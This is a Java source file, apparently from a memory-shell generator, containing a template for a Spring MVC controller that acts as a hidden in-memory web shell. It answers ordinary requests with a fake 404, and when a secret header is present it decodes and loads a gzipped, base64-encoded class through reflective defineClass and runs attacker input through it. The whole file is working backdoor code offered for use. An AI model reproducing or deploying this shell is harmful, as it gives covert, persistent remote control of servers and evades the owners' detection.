package org.leo.jmg.mem.shell.http;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.util.zip.GZIPInputStream;

/**
 * Spring MVC Controller Handler 的版本中立模板。
 *
 * <p>生成阶段按 servletNamespace 补入 Controller 接口和精确的 handleRequest
 * 方法描述符，因此同一模板可覆盖 Spring 5 的 javax 和 Spring 6 的 jakarta。</p>
 */
public class LeoControllerHandlerTpl {

    private static String headerName;
    private static String headerValue;
    private static String coreClassName;
    private static String coreClass;
    private static int respCode;

    public Object handleRequestObjects(Object request, Object response) throws Exception {
        String actualHeader = (String) request.getClass()
                .getMethod("getHeader", String.class).invoke(request, headerName);
        if (actualHeader == null || !actualHeader.contains(headerValue)) {
            response.getClass().getMethod("sendError", int.class).invoke(response, 404);
            return null;
        }

        response.getClass().getMethod("setStatus", int.class).invoke(response, respCode);
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int bytesRead;
        try {
            Class.forName(coreClassName, true, ClassLoader.getSystemClassLoader());
        } catch (ClassNotFoundException e) {
            GZIPInputStream gzip = new GZIPInputStream(
                    new ByteArrayInputStream(base64Decode(coreClass)));
            while ((bytesRead = gzip.read(buffer)) != -1) {
                output.write(buffer, 0, bytesRead);
            }
            Method defineClass = ClassLoader.class.getDeclaredMethod(
                    "defineClass", String.class, byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            defineClass.invoke(ClassLoader.getSystemClassLoader(), null,
                    output.toByteArray(), 0, output.size());
        } finally {
            InputStream input = (InputStream) request.getClass()
                    .getMethod("getInputStream").invoke(request);
            output.reset();
            while ((bytesRead = input.read(buffer)) != -1) {
                output.write(buffer, 0, bytesRead);
            }
            try {
                ((java.lang.reflect.InvocationHandler) Class.forName(coreClassName, true, ClassLoader.getSystemClassLoader())
                        .newInstance()).invoke(null, null, new Object[]{output});
            } catch (Throwable e) {
                throw new IllegalStateException("Core invocation failed", e);
            }
            Object responseOutput = response.getClass().getMethod("getOutputStream")
                    .invoke(response);
            responseOutput.getClass().getMethod("write", byte[].class)
                    .invoke(responseOutput, new Object[]{output.toByteArray()});
        }
        return null;
    }

    public byte[] base64Decode(String value) throws Exception {
        try {
            Class<?> clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class)
                    .invoke(clazz.newInstance(), value);
        } catch (Exception ignored) {
            Class<?> clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class)
                    .invoke(decoder, value);
        }
    }
}
